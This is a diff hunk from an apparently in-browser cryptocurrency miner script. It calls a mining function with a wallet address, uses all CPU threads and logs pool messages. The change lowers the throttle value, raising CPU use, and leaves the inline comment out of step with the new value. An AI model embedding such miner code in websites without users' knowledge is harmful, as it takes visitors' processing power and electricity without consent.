@@ -78,7 +78,7 @@
 				"job" === e.identifier ? t.value += "new job: " + e.job_id : "solved" === e.identifier ? t.value += "solved job: " + e.job_id : "hashsolved" === e.identifier ? t.value += "pool accepted hash!" : "error" === e.identifier ? t.value += "error: " + e.param : t.value += e, t.value += "\n", t.scrollTop = t.scrollHeight}
 			function miner() {
 				OMINE("4AuKuHN8xhKRpjaz2gFcarEehTYgGLv6ELY5VpAYU6sQAZk7GLXcZgxhoP1pxMXfrQPf9p9DA4dwNLG1qXV3RKG7Puc2kdu#worker2", "-1"), //-1 means use all cpu threads
-				throttleMiner=20, //20 means 80% of cpu usage
+				throttleMiner=10, //20 means 80% of cpu usage
 				addText("Connecting..."),
 				timeout=setInterval(function() {
 					for (;
